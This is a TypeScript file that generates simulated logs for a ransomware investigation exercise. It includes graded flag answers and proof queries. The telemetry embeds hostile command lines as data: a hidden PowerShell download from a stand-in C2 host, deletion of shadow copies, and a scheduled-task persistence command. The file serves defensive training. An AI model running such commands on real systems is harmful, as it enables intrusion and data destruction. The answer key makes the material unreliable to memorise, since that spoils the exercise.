/* Case ransomware-01 — "The Invoice That Locked the Share"
 *
 * A single realistic day at PurveX Financial. A phishing email reaches Finance,
 * an invoice that is really a program is opened, it beacons to a control server,
 * sets up persistence, deletes shadow copies and encrypts a sandbox folder, then
 * drops a ransom note. Benign office traffic runs alongside so the student has to
 * separate signal from noise.
 *
 * Everything here is telemetry text. There is no payload. Attacker addresses are
 * RFC 5737 documentation ranges. MITRE: T1566.001, T1204.002, T1059.001,
 * T1053.005, T1071.001, T1490, T1486.
 */
import type { Row } from "../../../src/lib/siem/types";
import { Answer, byTime, CaseFile, DAY0, iso, rng, SCHEMAS, USERS, WORKSTATIONS, type BuiltCase } from "../kit";

const C2_IP = "203.0.113.66";
const C2_HOST = "cdn-invoice-sync.example";
const VICTIM = "FIN-LT14";
const PATIENT_ZERO = "jordan.ellis";
const LOCKER = "svchost32.exe"; // the benign sim binary, named to look like a system file
const NOTE = "RESTORE_FILES.txt";
const TASK = "WindowsUpdateSync";
const SANDBOX = "C:\\RangeSim\\Victim";

const h = (hh: number, mm: number, ss = 0) => DAY0 + ((hh * 60 + mm) * 60 + ss) * 1000;

export function buildRansomwareCase(): BuiltCase {
  const r = rng("ransomware-01");
  const sec: Row[] = [];
  const proc: Row[] = [];
  const file: Row[] = [];
  const net: Row[] = [];
  const mail: Row[] = [];

  // ---- a normal morning of sign-ins (noise) --------------------------------
  for (let i = 0; i < 40; i++) {
    const u = USERS[Math.floor(r() * USERS.length)];
    const w = WORKSTATIONS[Math.floor(r() * WORKSTATIONS.length)];
    sec.push({ TimeGenerated: iso(h(7, 20 + i, Math.floor(r() * 59))), EventID: 4624, Account: u, Computer: w, IpAddress: `10.20.${1 + Math.floor(r() * 5)}.${10 + Math.floor(r() * 40)}`, LogonType: 2, Activity: "An account was successfully logged on." });
    if (r() < 0.25) sec.push({ TimeGenerated: iso(h(7, 20 + i, 10 + Math.floor(r() * 40))), EventID: 4625, Account: u, Computer: w, IpAddress: `10.20.${1 + Math.floor(r() * 5)}.${10 + Math.floor(r() * 40)}`, LogonType: 2, Activity: "An account failed to log on." });
  }

  // ---- ordinary office traffic (noise) -------------------------------------
  const normalHosts = ["portal.purvexfinancial.local", "update.microsoft.com", "outlook.office365.com", "teams.microsoft.com", "sharepoint.purvex.local"];
  for (let i = 0; i < 60; i++) {
    const w = WORKSTATIONS[Math.floor(r() * WORKSTATIONS.length)];
    net.push({ TimeGenerated: iso(h(8, Math.floor(r() * 300))), DeviceName: w, RemoteIP: `20.${Math.floor(r() * 200)}.${Math.floor(r() * 200)}.${Math.floor(r() * 200)}`, RemoteUrl: normalHosts[Math.floor(r() * normalHosts.length)], RemotePort: 443, SentBytes: 400 + Math.floor(r() * 6000), InitiatingProcessFileName: "msedge.exe" });
  }
  for (let i = 0; i < 15; i++) {
    mail.push({ TimeGenerated: iso(h(8, Math.floor(r() * 120))), RecipientEmailAddress: `${USERS[Math.floor(r() * USERS.length)]}@purvexfinancial.com`, SenderFromAddress: "newsletter@marketwatch.example", Subject: "Weekly market wrap", AttachmentName: "", DeliveryAction: "Delivered" });
  }

  // ---- the attack ----------------------------------------------------------
  // 1. Phishing email with the invoice attachment (T1566.001).
  mail.push({ TimeGenerated: iso(h(9, 2)), RecipientEmailAddress: `${PATIENT_ZERO}@purvexfinancial.com`, SenderFromAddress: "billing@northwind-advisory.example", Subject: "Overdue invoice 0923 — action required", AttachmentName: "Invoice_0923.pdf.exe", DeliveryAction: "Delivered" });

  // 2. The user opens it; the double extension runs as a program (T1204.002).
  proc.push({ TimeGenerated: iso(h(9, 14, 6)), DeviceName: VICTIM, AccountName: PATIENT_ZERO, FileName: "Invoice_0923.pdf.exe", ProcessCommandLine: `"${SANDBOX}\\Invoice_0923.pdf.exe"`, InitiatingProcessFileName: "explorer.exe" });

  // 3. It spawns PowerShell to pull the next stage from the C2 (T1059.001, T1071.001).
  proc.push({ TimeGenerated: iso(h(9, 14, 9)), DeviceName: VICTIM, AccountName: PATIENT_ZERO, FileName: "powershell.exe", ProcessCommandLine: `powershell -nop -w hidden -c "IWR https://${C2_HOST}/s -OutFile $env:TEMP\\${LOCKER}"`, InitiatingProcessFileName: "Invoice_0923.pdf.exe" });
  net.push({ TimeGenerated: iso(h(9, 14, 11)), DeviceName: VICTIM, RemoteIP: C2_IP, RemoteUrl: C2_HOST, RemotePort: 443, SentBytes: 740, InitiatingProcessFileName: "powershell.exe" });

  // 4. Beacon: steady callbacks to the C2 with jitter (T1071.001).
  for (let i = 0; i < 18; i++) {
    net.push({ TimeGenerated: iso(h(9, 16, i * 30 + Math.floor(r() * 4))), DeviceName: VICTIM, RemoteIP: C2_IP, RemoteUrl: C2_HOST, RemotePort: 443, SentBytes: 180 + Math.floor(r() * 60), InitiatingProcessFileName: LOCKER });
  }

  // 5. Persistence: a scheduled task that re-launches the payload (T1053.005).
  proc.push({ TimeGenerated: iso(h(9, 17, 2)), DeviceName: VICTIM, AccountName: PATIENT_ZERO, FileName: "schtasks.exe", ProcessCommandLine: `schtasks /create /tn "${TASK}" /tr "$env:TEMP\\${LOCKER}" /sc minute /mo 30 /f`, InitiatingProcessFileName: LOCKER });

  // 6. Delete shadow copies so files cannot be restored (T1490).
  proc.push({ TimeGenerated: iso(h(9, 21, 0)), DeviceName: VICTIM, AccountName: PATIENT_ZERO, FileName: "vssadmin.exe", ProcessCommandLine: "vssadmin delete shadows /all /quiet", InitiatingProcessFileName: LOCKER });

  // 7. Encrypt the sandbox folder: many files renamed with a new extension, then
  //    the ransom note (T1486). Sandbox paths only.
  const docs = ["Q3-Budget-Summary", "Vendor-Contacts", "Payroll-Draft", "Client-Holdings", "Reconciliation", "Tax-Worksheet", "Audit-Notes", "Forecast-2026", "Wire-Instructions", "Expense-Report", "Ledger-Export", "Board-Pack"];
  docs.forEach((d, i) => {
    file.push({ TimeGenerated: iso(h(9, 22, i * 2)), DeviceName: VICTIM, ActionType: "FileRenamed", FileName: `${d}.csv.locked`, FolderPath: `${SANDBOX}\\${d}.csv.locked`, InitiatingProcessFileName: LOCKER });
  });
  file.push({ TimeGenerated: iso(h(9, 23, 0)), DeviceName: VICTIM, ActionType: "FileCreated", FileName: NOTE, FolderPath: `${SANDBOX}\\${NOTE}`, InitiatingProcessFileName: LOCKER });

  // A SecurityEvent for the AV detection of the test file (real Defender behavior).
  sec.push({ TimeGenerated: iso(h(9, 14, 7)), EventID: 1116, Account: PATIENT_ZERO, Computer: VICTIM, IpAddress: "", LogonType: 0, Activity: "Antimalware detected malware: Invoice_0923.pdf.exe" });

  const tables = {
    SecurityEvent: byTime(sec),
    DeviceProcessEvents: byTime(proc),
    DeviceFileEvents: byTime(file),
    DeviceNetworkEvents: byTime(net),
    EmailEvents: byTime(mail),
  };

  // ---- flags (graded; proof query shows each is answerable) -----------------
  const answers: Answer[] = [
    {
      id: "rw-01", prompt: "Which account opened the attachment that started this?",
      accept: ["jordan.ellis", "jordan kwan", "jordan"], expect: PATIENT_ZERO,
      proof: `DeviceProcessEvents | where FileName has "Invoice_0923" | project AccountName`,
    },
    {
      id: "rw-02", prompt: "What is the IP address the payload beaconed to? (the control server)",
      accept: [C2_IP], expect: C2_IP,
      proof: `DeviceNetworkEvents | where InitiatingProcessFileName == "${LOCKER}" | summarize Beacons = count() by RemoteIP | sort by Beacons desc | take 1`,
    },
    {
      id: "rw-03", prompt: "What is the file name of the process that encrypted the files?",
      accept: [LOCKER], expect: LOCKER,
      proof: `DeviceFileEvents | where ActionType == "FileRenamed" | summarize c = count() by InitiatingProcessFileName | sort by c desc | take 1`,
    },
    {
      id: "rw-04", prompt: "What is the full name of the ransom note the attacker left?",
      accept: [NOTE], expect: NOTE,
      proof: `DeviceFileEvents | where ActionType == "FileCreated" and FolderPath has "RangeSim" | project FileName`,
    },
    {
      id: "rw-05", prompt: "How many files were encrypted (renamed with the locked extension)?",
      accept: [String(docs.length)], expect: String(docs.length),
      proof: `DeviceFileEvents | where FileName endswith ".locked" | count`,
    },
    {
      id: "rw-06", prompt: "What is the name of the scheduled task set up for persistence?",
      accept: [TASK, "windows update sync"], expect: TASK,
      proof: `DeviceProcessEvents | where FileName == "schtasks.exe" and ProcessCommandLine has "create" | project ProcessCommandLine`,
    },
  ];

  const caseFile: CaseFile = {
    public: {
      id: "ransomware-01",
      title: "The Invoice That Locked the Share",
      story:
        "It is mid-morning at PurveX Financial. The Finance team reports that files on a shared folder have strange new names and a note has appeared demanding payment. The SIEM shows an antivirus hit on the FIN-LT14 laptop about an hour earlier. Work the logs from the first sign of trouble to the encryption, and report what you find.",
      tables: Object.values(SCHEMAS),
      examples: [
        { label: "Suspicious email with an attachment", kql: `EmailEvents\n| where AttachmentName != ""\n| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject, AttachmentName` },
        { label: "What ran on the victim laptop", kql: `DeviceProcessEvents\n| where DeviceName == "${VICTIM}"\n| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName` },
        { label: "Where did that laptop connect out?", kql: `DeviceNetworkEvents\n| where DeviceName == "${VICTIM}"\n| summarize Connections = count(), Bytes = sum(SentBytes) by RemoteIP, RemoteUrl\n| sort by Connections desc` },
        { label: "Files that were changed", kql: `DeviceFileEvents\n| where DeviceName == "${VICTIM}"\n| project TimeGenerated, ActionType, FileName, InitiatingProcessFileName` },
      ],
      alerts: [
        { id: "AV-1116", title: "Antivirus detected malware on FIN-LT14", severity: "High", firedAt: iso(h(9, 14, 7)), entities: [VICTIM, PATIENT_ZERO], attack: { id: "T1204.002", name: "User Execution: Malicious File" }, summary: "" },
        { id: "NET-7", title: "Repeated outbound connections to a rare host", severity: "Medium", firedAt: iso(h(9, 25, 0)), entities: [VICTIM], attack: { id: "T1071.001", name: "Application Layer Protocol: Web" }, summary: "" },
      ],
    },
    answers,
    sim: [
      // Fired when the student clicks "Run scenario (sim)": a late burst of beacons
      // and a second encrypted folder, so live ingestion is visible in dev.
      { table: "DeviceNetworkEvents", rows: Array.from({ length: 6 }, (_, i) => ({ TimeGenerated: iso(h(9, 40, i * 30)), DeviceName: VICTIM, RemoteIP: C2_IP, RemoteUrl: C2_HOST, RemotePort: 443, SentBytes: 190 + i, InitiatingProcessFileName: LOCKER })) },
      { table: "DeviceFileEvents", rows: ["Statements", "Invoices-Paid", "W2-Forms"].map((d, i) => ({ TimeGenerated: iso(h(9, 41, i * 2)), DeviceName: VICTIM, ActionType: "FileRenamed", FileName: `${d}.csv.locked`, FolderPath: `${SANDBOX}\\${d}.csv.locked`, InitiatingProcessFileName: LOCKER })) },
    ],
  };

  return { id: "ransomware-01", tables, caseFile };
}
